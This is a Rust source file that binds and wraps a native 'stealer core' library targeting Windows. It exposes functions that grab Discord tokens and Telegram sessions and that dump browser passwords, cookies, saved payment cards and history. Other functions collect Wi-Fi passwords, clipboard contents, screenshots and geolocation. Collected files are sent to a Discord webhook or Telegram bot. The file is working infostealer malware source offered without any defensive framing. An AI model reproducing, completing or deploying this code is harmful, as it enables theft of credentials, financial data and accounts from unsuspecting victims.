// FFI bindings to the C++ stealer core library.
// All unsafe extern functions are only available on Windows targets.

#[allow(dead_code, unused_imports)]

#[cfg(target_os = "windows")]
mod inner {
    use std::ffi::{CStr, CString};
    use std::os::raw::{c_char, c_int};

    extern "C" {
        // Discord
        pub fn zed_discord_grab_tokens(out_buf: *mut c_char, buf_size: c_int) -> c_int;
        pub fn zed_discord_check_token(token: *const c_char) -> c_int;

        // Telegram
        pub fn zed_telegram_grab_sessions(dest_dir: *const c_char) -> c_int;

        // Browsers
        pub fn zed_browser_dump_cookies(
            browser: *const c_char,
            out_json: *mut c_char,
            buf_size: c_int,
        ) -> c_int;
        pub fn zed_browser_dump_passwords(
            browser: *const c_char,
            out_json: *mut c_char,
            buf_size: c_int,
        ) -> c_int;
        pub fn zed_browser_dump_cards(
            browser: *const c_char,
            out_json: *mut c_char,
            buf_size: c_int,
        ) -> c_int;
        pub fn zed_browser_dump_history(
            browser: *const c_char,
            out_json: *mut c_char,
            buf_size: c_int,
        ) -> c_int;

        // System
        pub fn zed_system_collect_info(out_json: *mut c_char, buf_size: c_int) -> c_int;
        pub fn zed_system_screenshot(out_path: *const c_char) -> c_int;
        pub fn zed_system_clipboard(out_buf: *mut c_char, buf_size: c_int) -> c_int;
        pub fn zed_system_wifi_passwords(out_json: *mut c_char, buf_size: c_int) -> c_int;
        pub fn zed_system_get_gpu(out_buf: *mut c_char, buf_size: c_int) -> c_int;
        pub fn zed_system_installed_apps(out_json: *mut c_char, buf_size: c_int) -> c_int;
        pub fn zed_system_startup_items(out_json: *mut c_char, buf_size: c_int) -> c_int;

        // Network
        pub fn zed_network_get_geo(out_json: *mut c_char, buf_size: c_int) -> c_int;

        // Delivery
        pub fn zed_deliver_discord(
            webhook_url: *const c_char,
            file_path: *const c_char,
            message: *const c_char,
        ) -> c_int;
        pub fn zed_deliver_telegram(
            bot_token: *const c_char,
            chat_id: *const c_char,
            file_path: *const c_char,
            caption: *const c_char,
        ) -> c_int;
    }

    // ── Safe Rust wrappers ─────────────────────────────────────────────────────

    pub fn discord_grab_tokens() -> Vec<String> {
        let mut buf = vec![0u8; 65536];
        let count = unsafe {
            zed_discord_grab_tokens(buf.as_mut_ptr() as *mut c_char, buf.len() as c_int)
        };
        if count == 0 { return vec![]; }
        let raw = unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string();
        raw.lines().filter(|l| !l.is_empty()).map(String::from).collect()
    }

    pub fn discord_check_token(token: &str) -> bool {
        let c = CString::new(token).unwrap_or_default();
        unsafe { zed_discord_check_token(c.as_ptr()) == 1 }
    }

    pub fn telegram_grab_sessions(dest: &str) -> bool {
        let c = CString::new(dest).unwrap_or_default();
        unsafe { zed_telegram_grab_sessions(c.as_ptr()) == 1 }
    }

    pub fn browser_dump_passwords(browser: &str) -> String {
        let mut buf = vec![0u8; 262144]; // 256 KB
        let c = CString::new(browser).unwrap_or_default();
        unsafe {
            zed_browser_dump_passwords(c.as_ptr(), buf.as_mut_ptr() as *mut c_char, buf.len() as c_int)
        };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn browser_dump_cookies(browser: &str) -> String {
        let mut buf = vec![0u8; 524288]; // 512 KB
        let c = CString::new(browser).unwrap_or_default();
        unsafe {
            zed_browser_dump_cookies(c.as_ptr(), buf.as_mut_ptr() as *mut c_char, buf.len() as c_int)
        };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn browser_dump_cards(browser: &str) -> String {
        let mut buf = vec![0u8; 65536];
        let c = CString::new(browser).unwrap_or_default();
        unsafe {
            zed_browser_dump_cards(c.as_ptr(), buf.as_mut_ptr() as *mut c_char, buf.len() as c_int)
        };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn browser_dump_history(browser: &str) -> String {
        let mut buf = vec![0u8; 524288];
        let c = CString::new(browser).unwrap_or_default();
        unsafe {
            zed_browser_dump_history(c.as_ptr(), buf.as_mut_ptr() as *mut c_char, buf.len() as c_int)
        };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn system_info() -> String {
        let mut buf = vec![0u8; 8192];
        let ok = unsafe {
            zed_system_collect_info(buf.as_mut_ptr() as *mut c_char, buf.len() as c_int)
        };
        if ok == 1 {
            unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
                .to_string_lossy().to_string()
        } else { String::new() }
    }

    pub fn system_get_gpu() -> String {
        let mut buf = vec![0u8; 512];
        unsafe { zed_system_get_gpu(buf.as_mut_ptr() as *mut c_char, buf.len() as c_int) };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn system_wifi_passwords() -> String {
        let mut buf = vec![0u8; 65536];
        unsafe { zed_system_wifi_passwords(buf.as_mut_ptr() as *mut c_char, buf.len() as c_int) };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn system_clipboard() -> String {
        let mut buf = vec![0u8; 4096];
        unsafe { zed_system_clipboard(buf.as_mut_ptr() as *mut c_char, buf.len() as c_int) };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn system_installed_apps() -> String {
        let mut buf = vec![0u8; 131072];
        unsafe { zed_system_installed_apps(buf.as_mut_ptr() as *mut c_char, buf.len() as c_int) };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn system_startup_items() -> String {
        let mut buf = vec![0u8; 16384];
        unsafe { zed_system_startup_items(buf.as_mut_ptr() as *mut c_char, buf.len() as c_int) };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn network_get_geo() -> String {
        let mut buf = vec![0u8; 4096];
        unsafe { zed_network_get_geo(buf.as_mut_ptr() as *mut c_char, buf.len() as c_int) };
        unsafe { CStr::from_ptr(buf.as_ptr() as *const c_char) }
            .to_string_lossy().to_string()
    }

    pub fn deliver_discord(webhook: &str, file: &str, msg: &str) -> i32 {
        let wh  = CString::new(webhook).unwrap_or_default();
        let fp  = CString::new(file).unwrap_or_default();
        let ms  = CString::new(msg).unwrap_or_default();
        unsafe { zed_deliver_discord(wh.as_ptr(), fp.as_ptr(), ms.as_ptr()) }
    }

    pub fn deliver_telegram(token: &str, chat: &str, file: &str, caption: &str) -> i32 {
        let t   = CString::new(token).unwrap_or_default();
        let c   = CString::new(chat).unwrap_or_default();
        let f   = CString::new(file).unwrap_or_default();
        let cap = CString::new(caption).unwrap_or_default();
        unsafe { zed_deliver_telegram(t.as_ptr(), c.as_ptr(), f.as_ptr(), cap.as_ptr()) }
    }
}

#[cfg(target_os = "windows")]
#[allow(unused_imports)]
pub use inner::*;
